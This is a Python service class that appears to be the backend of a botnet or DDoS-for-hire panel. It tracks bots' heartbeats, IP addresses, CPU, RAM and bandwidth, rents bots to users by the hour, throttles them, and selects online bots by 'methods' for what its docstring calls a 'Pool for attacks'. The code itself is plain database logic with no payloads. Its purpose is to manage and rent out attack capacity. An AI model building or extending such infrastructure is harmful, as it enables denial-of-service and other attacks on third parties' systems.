from datetime import datetime, timedelta, timezone, time as _time
from typing import Optional, List, Tuple
from uuid import UUID
from sqlalchemy import select, func, or_, and_
from app.database import async_session
from app.models.all_models import Bot, AdminLog

class BotService:
    @staticmethod
    async def list_bots(status=None, is_rented=None, country=None, search=None, page=1, per_page=50):
        async with async_session() as s:
            conds = []
            if status: conds.append(Bot.status == status)
            if is_rented is not None: conds.append(Bot.is_rented == is_rented)
            if country: conds.append(Bot.country == country.upper())
            if search: conds.append(or_(Bot.bot_identifier.ilike(f"%{search}%"), Bot.nickname.ilike(f"%{search}%"), Bot.ip_address.cast(str).ilike(f"%{search}%")))
            bq = select(Bot)
            if conds: bq = bq.where(and_(*conds))
            total = (await s.execute(select(func.count()).select_from(bq.subquery()))).scalar()
            items = (await s.execute(bq.order_by(Bot.last_heartbeat_at.desc().nulls_last()).offset((page-1)*per_page).limit(per_page))).scalars().all()
            return list(items), total

    @staticmethod
    async def get_bot(bot_id: UUID) -> Optional[Bot]:
        async with async_session() as s:
            return (await s.execute(select(Bot).where(Bot.id == bot_id))).scalar_one_or_none()

    @staticmethod
    async def set_status(bot_id: UUID, status: str):
        async with async_session() as s:
            bot = (await s.execute(select(Bot).where(Bot.id == bot_id))).scalar_one_or_none()
            if bot: bot.status = status; await s.commit()

    @staticmethod
    async def update_heartbeat(bot_id: UUID, data: dict):
        async with async_session() as s:
            bot = (await s.execute(select(Bot).where(Bot.id == bot_id))).scalar_one_or_none()
            if bot:
                bot.last_heartbeat_at = datetime.now(timezone.utc); bot.status = "online"
                for k in ("ip_address","cpu_cores","ram_total_mb","net_speed_mbps"):
                    if k in data: setattr(bot, k, data[k])
                await s.commit()

    @staticmethod
    async def assign_bot(bot_id: UUID, user_id: UUID, hours: int):
        async with async_session() as s:
            bot = (await s.execute(select(Bot).where(Bot.id == bot_id))).scalar_one_or_none()
            if not bot: raise ValueError("Bot not found")
            if bot.is_rented: raise ValueError("Already rented")
            bot.is_rented = True; bot.rented_by_user_id = user_id
            bot.rental_expires_at = datetime.now(timezone.utc) + timedelta(hours=hours)
            await s.commit()

    @staticmethod
    async def unassign_bot(bot_id: UUID):
        async with async_session() as s:
            bot = (await s.execute(select(Bot).where(Bot.id == bot_id))).scalar_one_or_none()
            if bot: bot.is_rented = False; bot.rented_by_user_id = None; bot.rental_expires_at = None; await s.commit()

    @staticmethod
    async def update_throttle(bot_id: UUID, data: dict):
        async with async_session() as s:
            bot = (await s.execute(select(Bot).where(Bot.id == bot_id))).scalar_one_or_none()
            if bot:
                for k,v in data.items():
                    if v is not None: setattr(bot, k, v)
                await s.commit()

    @staticmethod
    async def list_user_bots(user_id: UUID, page: int = 1, per_page: int = 50):
        """Bots rented by this user."""
        async with async_session() as s:
            bq = select(Bot).where(Bot.rented_by_user_id == user_id)
            total = (await s.execute(select(func.count()).select_from(bq.subquery()))).scalar() or 0
            items = (await s.execute(
                bq.order_by(Bot.last_heartbeat_at.desc().nulls_last())
                .offset((page - 1) * per_page).limit(per_page)
            )).scalars().all()
            return list(items), total

    @staticmethod
    async def get_available_bots(count: int, methods: List[str], user_id: Optional[UUID] = None) -> List[Bot]:
        """Pool for attacks: online bots free OR rented by this user."""
        async with async_session() as s:
            if user_id:
                q = select(Bot).where(
                    Bot.status == "online",
                    or_(Bot.is_rented == False, Bot.rented_by_user_id == user_id),
                ).limit(count)
            else:
                q = select(Bot).where(Bot.status == "online", Bot.is_rented == False).limit(count)
            result = await s.execute(q)
            return list(result.scalars().all())

    @staticmethod
    async def count_online() -> int:
        async with async_session() as s:
            return (await s.execute(select(func.count(Bot.id)).where(Bot.status == "online"))).scalar() or 0

    @staticmethod
    async def log_admin_action(admin_id: UUID, action: str, target_type: str, target_id: UUID, details: dict = None):
        async with async_session() as s:
            s.add(AdminLog(admin_id=admin_id, action=action, target_type=target_type, target_id=target_id, details=details or {}))
            await s.commit()